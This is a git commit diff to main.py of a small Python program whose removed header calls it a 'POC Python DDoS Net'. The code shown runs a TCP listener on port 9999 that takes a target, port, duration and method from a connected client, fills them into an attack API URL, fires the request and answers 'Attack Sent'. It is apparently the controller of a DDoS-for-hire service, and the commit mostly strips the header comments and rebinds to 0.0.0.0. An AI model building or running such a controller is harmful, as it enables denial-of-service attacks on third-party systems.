e01bc26dc55dc1b722eefba918bb59804082caa2
big0454 <kaewketup9999@gmail.com>
2024-11-17 11:46:47 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,15 +1,12 @@
 
-# Dark Net
-# Created By Swev#9999
-# POC Python DDoS Net
 
 import socket
 import requests
 import threading
 import json
 
-server_address = "1.1.1.1" # CHANGE THIS
-port = 9999 # CHANGE THIS IF YOU KNOW WHAT YOU'RE DOING
+server_address = "0.0.0.0" 
+port = 9999
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((server_address, port))
@@ -48,7 +45,7 @@ def handle(client):
               r=requests.get(data["api"].replace("<<$target>>", target).replace("<<$port>>", port).replace("<<$time>>", time).replace("<<$method>>", method)).text
               client.send(f"Attack Sent: {r}\n\r\n\r".encode())
    except:
-     pass # connection closed
+     pass 
 
 sock.listen(1)
 
